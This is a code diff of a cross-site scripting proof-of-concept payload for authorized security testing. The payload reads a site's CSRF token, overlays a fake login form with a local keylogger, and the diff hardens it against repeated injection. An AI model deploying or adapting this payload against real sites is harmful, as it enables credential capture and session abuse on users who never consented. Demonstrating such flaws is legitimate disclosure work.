@@ -8,14 +8,23 @@
  *  - display cookie/CSRF visibility (HttpOnly tokens must stay hidden)
  *  - render a demo login form with a local keylogger when logged out
  *
+ * The page reflects the payload into several attributes, so this file may be
+ * requested/injected more than once. The script is idempotent: only the first
+ * execution builds the UI, later executions increment a counter and return.
+ *
  * No data leaves the page and nothing is stored.
  */
 (function () {
   'use strict';
-  if (window.__DEMO_POC__) return;
+  if (window.__DEMO_POC__) {
+    window.__DEMO_EXEC_COUNT__ = (window.__DEMO_EXEC_COUNT__ || 1) + 1;
+    return;
+  }
   window.__DEMO_POC__ = true;
+  window.__DEMO_EXEC_COUNT__ = 1;
 
   var WARN = 'SECURITY DEMO — authorized testing only. No data is sent anywhere.';
+  var HOST_ID = 'demo-poc-host';
 
   function el(tag, attrs, text) {
     var e = document.createElement(tag);
@@ -35,14 +44,14 @@
     try { return (window.ACC && ACC.config && ACC.config.CSRFToken) || ''; } catch (e) { return ''; }
   }
 
-  var host = el('div', { style: 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif' });
+  var host = el('div', { id: HOST_ID, style: 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif' });
   var shadow = host.attachShadow ? host.attachShadow({ mode: 'open' }) : host;
 
   var box = el('div', { style: 'width:min(760px,92vw);max-height:88vh;overflow:auto;background:#fff;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,.4);color:#1f2328' });
   var head = el('div', { style: 'padding:14px 18px;border-bottom:1px solid #e5e7eb;display:flex;justify-content:space-between;align-items:center;gap:12px' });
   head.appendChild(el('div', { style: 'font-weight:700;font-size:15px' }, 'Security Demo (XSS PoC)'));
   var closeBtn = el('button', { style: 'border:0;background:#111;color:#fff;border-radius:8px;padding:8px 12px;cursor:pointer' }, 'Close');
-  closeBtn.onclick = function () { host.remove(); };
+  closeBtn.onclick = function () { host.remove(); window.__DEMO_POC__ = false; };
   head.appendChild(closeBtn);
 
   var warn = el('div', { style: 'margin:12px 18px;padding:10px 12px;background:#fff4e5;border-left:4px solid #b35900;border-radius:6px;font-size:12.5px;color:#7a3d00' }, WARN);
@@ -62,7 +71,6 @@
   box.appendChild(head); box.appendChild(warn); box.appendChild(body);
   body.appendChild(actions); body.appendChild(out);
   shadow.appendChild(box);
-  document.documentElement.appendChild(host);
 
   function showPersonal() {
     say('Loading…');
@@ -179,5 +187,15 @@
     });
   }
 
-  build();
+  function init() {
+    if (document.getElementById(HOST_ID)) { window.__DEMO_POC__ = false; return; }
+    (document.body || document.documentElement).appendChild(host);
+    build();
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init, { once: true });
+  } else {
+    init();
+  }
 })();
